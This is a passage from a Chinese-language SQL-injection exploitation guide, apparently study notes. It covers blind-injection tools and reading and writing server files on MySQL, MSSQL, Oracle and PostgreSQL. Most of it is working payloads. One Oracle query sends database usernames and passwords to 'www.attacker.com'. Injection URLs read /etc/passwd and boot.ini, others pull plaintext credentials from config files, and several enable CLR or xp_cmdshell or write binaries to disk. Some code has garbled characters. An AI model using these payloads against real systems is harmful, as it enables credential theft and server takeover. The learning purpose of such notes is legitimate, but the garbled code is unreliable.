<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> LENGTH<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dba_users <span class="token keyword">WHERE</span> UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span>username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password<span class="token punctuation">)</span> <span class="token operator">IS</span> <span class="token operator">NOT</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="ICMP渗透"><a href="#ICMP渗透" class="headerlink" title="ICMP渗透"></a>ICMP渗透</h4><h3 id="自动SQL盲注利用"><a href="#自动SQL盲注利用" class="headerlink" title="自动SQL盲注利用"></a>自动SQL盲注利用</h3><h4 id="Absinthe"><a href="#Absinthe" class="headerlink" title="Absinthe"></a>Absinthe</h4><p>Absinthe的威力在于支持数据库映射，并且能利用基于错误和响应的推断利用来对很多流行的数据库（不管是商业的还是开源的）进行检索。方便的GUI为攻击者带来了很好的体验，但缺少特征签名支持限制了其效能。</p>
<h4 id="BSQL-Hacker"><a href="#BSQL-Hacker" class="headerlink" title="BSQL Hacker"></a>BSQL Hacker</h4><p>BSQL Hacker是另一款图形化工具，它使用基于时间及响应的推断技术和标准错误来从所提问的数据库中提取数据。虽然它仍处于测试阶段，不是很稳定，但该工具前景很好且提供了很多欺诈机会。</p>
<p><a target="_blank" rel="noopener" href="https://labs.portcullis.co.uk/apologies-page-not-found/#aHR0cHM6Ly9sYWJzLnBvcnRjdWxsaXMuY28udWsvYXBwbGljYXRpb24vYnNhbC1oYWNrZXI=">Apologies, page not found | Portcullis Labs</a></p>
<h4 id="SQLBrute"><a href="#SQLBrute" class="headerlink" title="SQLBrute"></a>SQLBrute</h4><p>SQLBrute是一款命令行工具，它针对希望使用基于时间或响应的推断来利用某个固定漏洞的用户。</p>
<h4 id="Sqlmap-1"><a href="#Sqlmap-1" class="headerlink" title="Sqlmap"></a>Sqlmap</h4><p>Sqlmap将漏洞的发现和利用结合在一款强大的工具中，它既支持基于时间的推断方法，也支持基于响应的推断方法，另外还支持ICMP通道方法。该工具的成长速度很快，开发也很活跃。</p>
<h4 id="Sqlninja"><a href="#Sqlninja" class="headerlink" title="Sqlninja"></a>Sqlninja</h4><p>Sqlninja有很多特性，它支持使用基于DNS的非主流通道来执行远程命令。首先上传一个自定义的二进制封装器（wrapper），然后通过上传的封装器来执行命令。封装器捕获所有来自命令的输出并初始化一个DNS请求序列，请求中包含了编码后的输出。</p>
<h4 id="Squeeza"><a href="#Squeeza" class="headerlink" title="Squeeza"></a>Squeeza</h4><p>Squeeza则从另一个视角审视SQL注入，它将数据创建与数据提取区分开来。该命令行工具可使用基于时间的推断、标准错误或DNS来提取时间。DNS通道完全借助T-SQL来执行，因而不需要上传二进制封装器。</p>
<h2 id="利用操作系统"><a href="#利用操作系统" class="headerlink" title="利用操作系统"></a>利用操作系统</h2><p>访问文件系统以执行有效的任务（比如读取数据和上传文件）</p>
<h3 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h3><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>攻击者希望能够读取ASCII文本和二进制文件。</p>
<h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><p>MySQL提供LOAD DATA INFILE和LOAD_FILE命令将文本文件读到数据库中。</p>
<p>LOAD DATA INFILE语句以非常快的速度从文本文件中读取一行数据至表中。文件名必须是字符串字面值。</p>
<p>用法</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#先创建一个文本test.txt，格式：</span>
<span class="token comment">#name school old</span>
<span class="token comment">#创建一张表来保存读取的信息</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> test<span class="token punctuation">(</span>name <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>school <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>old <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#读取并填充表</span>
<span class="token keyword">load</span> <span class="token keyword">data</span> <span class="token keyword">infile</span> <span class="token string">'/xxx/test.txt'</span> <span class="token keyword">into</span> <span class="token keyword">table</span> test <span class="token keyword">fields</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token comment">#读取成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>LOAD_FILE该函数不创建表可以直接传递结果</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/xxx/test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#注入回显文件的内容</span>
dvwa<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>sqli<span class="token operator">/</span>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,load_file('</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd'<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>Submit<span class="token operator">=</span>Submit<span class="token comment">#</span>
<span class="token comment">#通常etc/passwd换成16进制，以省略单引号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#获取二进制文件</span>
<span class="token string">'union select NULL,HEX(LOAD_FILE('</span><span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token keyword">temp</span><span class="token punctuation">.</span>ini'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>LOAD_FILE（）还接收UNC（通用命名约定）路径，攻击者可以在其他机器上搜索文件，甚至可以引导MySQL服务器连接到他们自己的机器</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'//172.16.125.2/temp_smb/test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h5><p>攻击者（己经获取系统管理员权限）通常首先借用的是BULK INSERT语句。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test.asp?sname=%</span>
<span class="token comment">#返回了所有用户，注入点</span>

<span class="token comment">#确定所运行的权限 sa</span>
http:<span class="token comment">//test.asp?sname='union select NULL,NULL,NULL,loginame FROM master..sysprocesses</span>
<span class="token keyword">WHERE</span> spid <span class="token operator">=</span> @<span class="token variable">@SPID</span><span class="token comment">-- </span>

<span class="token comment">#执行读取命令</span>
http:<span class="token comment">//test.asp?sname='; create table hacked(line varchar(8000)); bulk insert hacked from 'c:\boot.ini';-- </span>

<span class="token comment">#查看表就会看到已经插入</span>
http:<span class="token comment">//test.asp?sname='union select NULL,NULL,NULL,line from hacked-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Squeeza工具，允许攻击者在后台临时表中执行批量插入，然后使用所选的通信机制（DNS、错误消息、时间）来提取信息，最后再在攻击者的机器上重建该文件。</p>
<p>使用一个针对目标应用程序的squeeza.config文件来提取两个文件——远程服务器的 boot.ini 和二进制的 c:\winnt\system32\net.exe</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>coрy 
c:<span class="token punctuation">\</span>boot.ini stolen-boot.ini 
c:<span class="token punctuation">\</span>winnt<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>net.exe stolen-net.exe
<span class="token operator">!</span>quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>缺少批量插入方法</p>
<p>使用(滥用)Scripting.FileSystemObject。</p>
<p>引入了公共语言运行时(Microsoft Language Runtime，CLR)。它允许开发人员将.NET二进制文件轻而易举地集成到数据库中。</p>
<p>通过向SQL Server导入程序集时所使用的方法来实现，SQL Server 2005默 认禁用了CLR集成。拥有系统管理员或与之等价的权限，以使用sp configure存储过程重新启用该功能</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
<span class="token keyword">exec</span> sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span>
<span class="token keyword">RECONFIGURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#使用CREATE ASSEMBLY函数从远程服务器加载任何.NET二进制文件至数据库中</span>
<span class="token comment">#使用下列注入字符串加载.NET程序集c:\temp\test.exe：</span>
sname<span class="token operator">=</span><span class="token string">';create assembly sqb from '</span>c:\<span class="token keyword">temp</span>\test<span class="token punctuation">.</span>exe<span class="token string">' with permission_set =unsafe-- 

#SQL Server在sys.assembly_files表中存储原始的二进制文件（作为HEX字符串）

sname='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>substring<span class="token punctuation">(</span>content<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>assembly_files<span class="token comment">-- </span>
<span class="token comment">#将二进制文件读取到web页面</span>

<span class="token keyword">create</span> assembly sqb <span class="token keyword">from</span> <span class="token string">'c:\temp\test.exe'</span>
<span class="token comment">#添加到原始库</span>
<span class="token keyword">alter</span> assembly sqb <span class="token keyword">add</span> <span class="token keyword">file</span> <span class="token keyword">from</span> <span class="token string">'c:\windows\system32\net.exe'</span>
<span class="token keyword">alter</span> assembly sqb <span class="token keyword">add</span> <span class="token keyword">file</span> <span class="token keyword">from</span> <span class="token string">'c:\temp\test.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="Oracle-5"><a href="#Oracle-5" class="headerlink" title="Oracle"></a>Oracle</h5><p> utl_file_dir/Oracle 目录、Java、Oracle Text三种接口访问文件</p>
<p> utl_file_dir/Oracle 目录</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">utl_file<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">8</span> 至 <span class="token number">11</span>g<span class="token punctuation">)</span>

DBMS_LOB<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">8</span> 至 <span class="token number">11</span>g<span class="token punctuation">)</span>
<span class="token comment">#从rds.txt文件读取了1000个字节(从第1个字节开始)，该文件位于MEDIA DIR目录中。</span>
<span class="token keyword">DECLARE</span>
buf varchar2<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
BEG <span class="token operator">IN</span>
Lob_loc:<span class="token operator">=</span> BFILENAME<span class="token punctuation">(</span><span class="token string">'MEDIA_DIR'</span><span class="token punctuation">,</span><span class="token string">'rds.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">OPEN</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> DBMS_LOB<span class="token punctuation">.</span>LOB_READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">READ</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
dbms_output<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>utl_raw<span class="token punctuation">.</span>cast_to_varchar2<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">CLOSE</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>

外部表<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">9</span>i R2 至 <span class="token number">11</span>g<span class="token punctuation">)</span>
<span class="token keyword">create</span> directory ext <span class="token keyword">as</span> <span class="token string">'C:\';
CREATE TABLE ext_tab(
line varchar2(256))
ORGANIZATION EXTERNAL (TYPE oracle_loader
DEFAULT DIRECTORY extACCESS PARAMETERS (
RECORDS DELIMITED BY NEWLINE
BADFILE '</span>bad_data<span class="token punctuation">.</span>bad<span class="token string">'
LOGFILE '</span>log_data<span class="token punctuation">.</span>log<span class="token string">'
FIELDS TERMINATED BY '</span><span class="token punctuation">,</span><span class="token string">'
MISSING FIELD VALUES ARE NULL
REJECT ROWS WITH ALL NULL FIELDS
(line))
LOCATION ('</span>victim<span class="token punctuation">.</span>txt<span class="token string">')
)
PARALLEL
REJECT LIMIT 0
NOMONITORING;
Select * from ext_tab;

'</span>
XMLType<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">9</span>i R2 至 <span class="token number">11</span>g<span class="token punctuation">)</span>
<span class="token comment">#从data-source.xml文件中读取用户名、明文口令和连接字符串</span>
<span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@user'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'/'</span><span class="token operator">||</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@password'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'@'</span><span class="token operator">||</span>substr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>instr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'//'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> conn <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token punctuation">(</span>XMLSequence<span class="token punctuation">(</span>extract<span class="token punctuation">(</span>xmltype<span class="token punctuation">(</span>bfilename<span class="token punctuation">(</span><span class="token string">'GETPWDIR'</span><span class="token punctuation">,</span><span class="token string">'datasources.xml'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>nls_charset_id<span class="token punctuation">(</span><span class="token string">'WE8ISO8859P1'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token string">'/data-sources/connection-pool/connection-factory'</span>
<span class="token punctuation">)</span>
<span class="token punctuation">)</span>
<span class="token punctuation">)</span>c
<span class="token operator">/</span>

<span class="token comment">#Oracle Text是一种很少有人知道的读取文件和URInate的技术。它不需要Java或utl_file_dir/Oracle目录，只需将想读取的文件或URL插入到一张表中并创建一个全文索引或者一直等待全文索引创建成功即可。该索引了包含整个文件的内容。</span>
<span class="token comment">#下列示例代码说明了如何通过将boot.ini插入到一张表中来读取该文件</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> files <span class="token punctuation">(</span>id NUMBER <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>
path <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span><span class="token punctuation">;</span>ot_format <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> files <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'c:\boot.ini'</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> file_index <span class="token keyword">ON</span> files<span class="token punctuation">(</span>path<span class="token punctuation">)</span> INDEXTYPE <span class="token operator">IS</span> ctxsys<span class="token punctuation">.</span>contextPARAMETERS<span class="token punctuation">(</span><span class="token string">'datastore ctxsys.file_datastore format column ot_format'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- retrieve data from the fulltext index</span>
<span class="token keyword">Select</span> token_text <span class="token keyword">from</span> dr$file_index$i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="PostgreSQL-3"><a href="#PostgreSQL-3" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><p>PostgreSQL提供了内置的COPY功能，可以将文本文件复制到表中的text字段，使用COPY 功能复制文件时，该文本文件应该是完全可读的(world readable),或者运行PostgreSQL进程的用户(通常是postgres用户)应该是该文件的所有者。</p>
<p>下面的例子演示了攻击者如何读取 ‘etc/passwd’文件的内容：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#创建一个临时表</span>
http:<span class="token comment">//10.10.10.114/test.php?id=1;CREATE table temp (name text);-- </span>

<span class="token comment">#将文件复制到表中</span>
http:<span class="token comment">//10.10.10.114/test.php?id=1;copy temp from '/etc/passwd'-- </span>

<span class="token comment">#读取表。在将文件复制到表中之后，就可以使用SQL注入技术来读取该表，比如使用 union技术或盲注技术</span>
http:<span class="token comment">//10.10.10.114/test.php?id=l union select 2,name from temp-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><h5 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h5><p>select into outfile（dumpfile）该命令可以将一条select语句的结果写到MySQL进程所有者拥有的完全可读的文件中（dumpfile允许写二进制文件）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'test'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/tmp/test.txt'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#使用下列搜索字符串：</span>
aaa <span class="token string">'union select NULL,'</span>SensePost <span class="token number">2008</span>\n<span class="token string">' into dumpfile '</span><span class="token operator">/</span>tmp<span class="token operator">/</span>sp<span class="token punctuation">.</span>txt' <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用的是dumpfile(允许输出二进制文件)而非 outfile，这样一来，要想正常结束一行，就必须提供\n</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> UNHEX<span class="token punctuation">(</span><span class="token string">'53656E7365506F7374203038'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#unhex()和hex()相反</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="Mssql-1"><a href="#Mssql-1" class="headerlink" title="Mssql"></a>Mssql</h5><p>读取文件的scripting.filesystem对象方法来有效地向文件系统写文件，也可以使用该技术来写二进制文件，某些代码页面使用该技术的话会出现错误，对于这种情况，可以使用其他对象而非filesystem对象，比如ADODB.Stream。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#批量复制程序BCP</span>
C:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>bcp <span class="token string">"select name from sysobjects"</span> queryout testout<span class="token punctuation">.</span>txt <span class="token operator">-</span>c <span class="token operator">-</span>S <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>U sa <span class="token operator">-</span>P<span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#使用重定向运算符&gt;&gt;创建文本文件：</span>
<span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo This	is a test &gt;c:\temp\test.txt'</span>
<span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo This	is line	2 &gt;&gt;c:\temp\test.txt'</span>
<span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo This	is line	3
&gt;&gt;c:\temp\test.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#先创建一个debug.exe脚本文件，然后将它传递给debug.exe以转换成一个二进制文件。</span>
C:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>debug <span class="token operator">&lt;</span> demo<span class="token punctuation">.</span>scr
<span class="token operator">-</span>n demo<span class="token punctuation">.</span>com
<span class="token operator">-</span>e <span class="token number">0000</span> <span class="token number">4</span>D <span class="token number">5</span>A <span class="token number">90</span> <span class="token number">00</span> <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">04</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> FF FF <span class="token number">00</span> <span class="token number">00</span>
<span class="token operator">-</span>e <span class="token number">0010</span> B8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> o0 o0 <span class="token number">00</span>
<span class="token operator">-</span>е <span class="token number">0040</span> <span class="token number">0</span>E <span class="token number">1</span>F BA OE <span class="token number">00</span> B4 <span class="token number">09</span> CD <span class="token number">21</span> B8 <span class="token number">01</span> <span class="token number">4</span>C CD <span class="token number">21</span> <span class="token number">54</span> <span class="token number">68</span>
<span class="token operator">-</span>е <span class="token number">0050</span> <span class="token number">69</span> <span class="token number">73</span> <span class="token number">20</span> <span class="token number">70</span> <span class="token number">72</span> <span class="token number">6</span>F <span class="token number">67</span> <span class="token number">72</span> <span class="token number">61</span> <span class="token number">6</span>D <span class="token number">20</span> <span class="token number">63</span> <span class="token number">61</span> <span class="token number">6</span>E <span class="token number">6</span>E <span class="token number">6</span>F
<span class="token operator">-</span>е <span class="token number">0060</span> <span class="token number">74</span> <span class="token number">20</span> <span class="token number">62</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">72</span> <span class="token number">75</span> <span class="token number">6</span>E <span class="token number">20</span> <span class="token number">69</span> <span class="token number">6</span>E <span class="token number">20</span> <span class="token number">44</span> <span class="token number">4</span>F <span class="token number">53</span> <span class="token number">20</span>
<span class="token operator">-</span>e <span class="token number">0070</span> <span class="token number">6</span>D <span class="token number">6</span>F <span class="token number">64</span> <span class="token number">65</span> <span class="token number">2</span>E OD OD <span class="token number">0</span>A <span class="token number">24</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">-</span>rex
CX <span class="token number">0000</span>
:<span class="token number">4200</span>
<span class="token operator">-</span>w <span class="token number">0</span>
Writing <span class="token number">04200</span> bytes
<span class="token operator">-</span>q
C:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>dir demo<span class="token operator">*</span>
<span class="token number">2008</span><span class="token operator">/</span><span class="token number">12</span><span class="token operator">/</span><span class="token number">27</span> <span class="token number">03</span>:<span class="token number">18</span>p	<span class="token number">16</span><span class="token punctuation">,</span><span class="token number">896</span> demo<span class="token punctuation">.</span>com
<span class="token number">2005</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">/</span><span class="token number">21</span> <span class="token number">11</span>:<span class="token number">08</span>a	<span class="token number">61</span>r280 demo<span class="token punctuation">.</span>scr


copy <span class="token operator">/</span>b chunk<span class="token operator">-</span><span class="token number">1.</span>exe_ <span class="token operator">+</span> chunk<span class="token operator">-</span><span class="token number">2.</span>exe_ <span class="token operator">+</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">+</span> chunk<span class="token operator">-</span>n<span class="token punctuation">.</span>exe original<span class="token operator">-</span><span class="token keyword">file</span><span class="token punctuation">.</span>exe <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="Oracle-6"><a href="#Oracle-6" class="headerlink" title="Oracle"></a>Oracle</h5><p>Oracle中多种创建文件的方法</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UTL_FILE
DBMS_ADVISOR
DBMS_XSLPROCESSOR
DBMS_XMLDOM
外部表
Java
操作系统命令和重定向<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>自Oracle 9i以来，utl_file可以在文件系统上写二进制代码。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#在数据库服务器的C:驱动器或恰当的UNIX路径中创建了一个二进制文件hello.com：</span>
<span class="token keyword">Create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> directory EXT <span class="token keyword">AS</span> <span class="token string">'C:\';
DECLARE fi UTL_FILE.FILE_TYPE;
bu RAW(32767);
BEGIN
bu:=hextoraw(1BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fi:<span class="token operator">=</span>UTL_FILE<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">'EXT'</span><span class="token punctuation">,</span><span class="token string">'hello.com'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_FILE<span class="token punctuation">.</span>put_raw<span class="token punctuation">(</span>fi<span class="token punctuation">,</span>bu<span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_FILE<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>fi<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DBMS_ADVISOR可能是创建文件的最快捷方法</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> directory EXT <span class="token keyword">as</span> <span class="token string">'C:\';
